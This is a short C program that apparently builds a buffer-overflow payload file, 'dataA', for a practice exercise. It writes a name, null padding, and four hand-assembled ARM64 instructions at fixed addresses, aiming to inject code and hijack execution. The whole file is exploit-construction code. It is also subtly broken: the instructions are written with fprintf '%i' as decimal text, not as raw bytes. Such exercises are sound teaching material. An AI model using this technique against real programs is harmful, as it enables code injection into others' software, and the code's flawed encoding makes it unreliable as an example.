#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

int main(void)
{
    int i;
    const char* name = "Tansha Vugarwal";
    unsigned int uiMovInstr = MiniAssembler_mov(0, 41);
    unsigned int uiAdrInstr = MiniAssembler_adr(1, 0x420044, 0xffffbe79162d);
    unsigned int uiStrbInstr = MiniAssembler_strb(0, 1);
    unsigned int uiBInstr = MiniAssembler_b(0x40085c, 0xffffbe79162f);

    FILE *psFile;

    psFile = fopen("dataA", "w");

    /* Printing out 15-character long name. */
    fprintf(psFile, "%s", name);

    for (i = 0; i < 17; i++)
    {
        putc('\0', psFile); /* Writes 00000000 */
    }

    fprintf(psFile, "%i", uiMovInstr);
    fprintf(psFile, "%i", uiAdrInstr);
    fprintf(psFile, "%i", uiStrbInstr);
    fprintf(psFile, "%i", uiBInstr);

    fclose(psFile);

    return 1;
}

